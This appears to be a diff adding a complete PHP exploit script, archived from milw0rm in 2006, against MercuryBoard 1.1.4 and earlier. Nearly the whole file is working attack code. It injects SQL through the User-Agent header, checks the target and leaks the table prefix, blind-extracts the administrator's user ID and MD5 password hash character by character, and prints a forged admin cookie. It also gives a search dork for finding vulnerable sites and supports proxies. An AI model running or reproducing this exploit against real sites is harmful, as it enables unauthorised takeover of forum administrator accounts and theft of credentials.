@@ -1,0 +1,185 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+print_r('
+--------------------------------------------------------------------------------
+MercuryBoard <= 1.1.4 "User-Agent" SQL injection / privilege escalation exploit
+(php version)
+by rgod rgod@autistici.org
+site: http://retrogod.altervista.org
+dork: "Powered by MercuryBoard"
+--------------------------------------------------------------------------------
+');
+/*
+works regardless of php.ini settings
+against MySQL > 4.1 (allowing subs)
+original exploit: http://www.milw0rm.com/exploits/1058 coded by 1dt.w0lf
+not working for me, so I wrote my version
+vulnerability is actually unpatched...
+*/
+
+if ($argc<3) {
+print_r('
+--------------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path OPTIONS
+host:      target server (ip/hostname)
+path:      path to MercuryBoard
+Options:
+   -p[port]:    specify a port other than 80
+   -P[ip:port]: specify a proxy
+Examples:
+php '.$argv[0].' localhost /mercury/
+php '.$argv[0].' localhost /mercury/ -p81
+php '.$argv[0].' localhost / -P1.1.1.1:80
+--------------------------------------------------------------------------------
+');
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+   $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+   }
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$packet="GET ".$p."index.php?a=active HTTP/1.0\r\n";
+$packet.="User-Agent: '\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (eregi("REPLACE INTO",$html))
+{
+echo "vulnerable...\n";
+$temp=explode("REPLACE INTO ",$html);
+$temp2=explode("active",$temp[1]);
+$prefix=$temp2[0];
+echo "prefix -> ".$prefix."\n";sleep(1);
+}
+else
+{
+die("not vulnerable...\n");
+}
+
+$ch[0]=0;//null
+$ch=array_merge($ch,range(48,57)); //numbers
+$j=1;
+$id="";
+echo "building the admin cookie...\nid: ";
+while (!strstr($id,chr(0)))
+{
+for ($i=0; $i<=255; $i++)
+{
+if (in_array($i,$ch))
+{
+$packet="GET ".$p."index.php?a=active HTTP/1.0\r\n";
+$packet.="User-Agent: 666','suntzu'),(1,'active',0,'','','',(SELECT(IF((ASCII(SUBSTRING(user_id,".$j.",1))=".$i."),'suntzu','suntzoi'))/**/FROM/**/".$prefix."users/**/WHERE/**/user_group=1))/*\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (eregi("You have an error in your SQL syntax near 'SELECT",$html))
+{die("\nWrong MySql version, sorry...");}
+if (!eregi("Viewing the active users",$html)) {$id.=chr($i);echo chr($i);sleep(1);break;}
+}
+if ($i==255) {die("\nExploit failed...");}
+}
+$j++;
+}
+
+$chars[0]=0;//null
+$chars=array_merge($chars,range(48,57)); //numbers
+$chars=array_merge($chars,range(97,102));//a-f letters
+$j=1;$password="";
+echo "\npassword (md5): ";
+while (!strstr($password,chr(0)))
+{
+for ($i=0; $i<=255; $i++)
+{
+if (in_array($i,$chars))
+{
+$packet="GET ".$p."index.php?a=active HTTP/1.0\r\n";
+$packet.="User-Agent: 666','suntzu'),(1,'active',0,'','','',(SELECT(IF((ASCII(SUBSTRING(user_password,".$j.",1))=".$i."),'suntzu','suntzoi'))/**/FROM/**/".$prefix."users/**/WHERE/**/user_group=1))/*\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (!eregi("Viewing the active users",$html)) {$password.=chr($i);echo chr($i);sleep(1);break;}
+}
+if ($i==255) {die("\nExploit failed...");}
+}
+$j++;
+}
+echo "\nyour admin cookie:\n mercury_user=$id; mercury_pass=$password;\n";
+?>
+
+# milw0rm.com [2006-08-23]
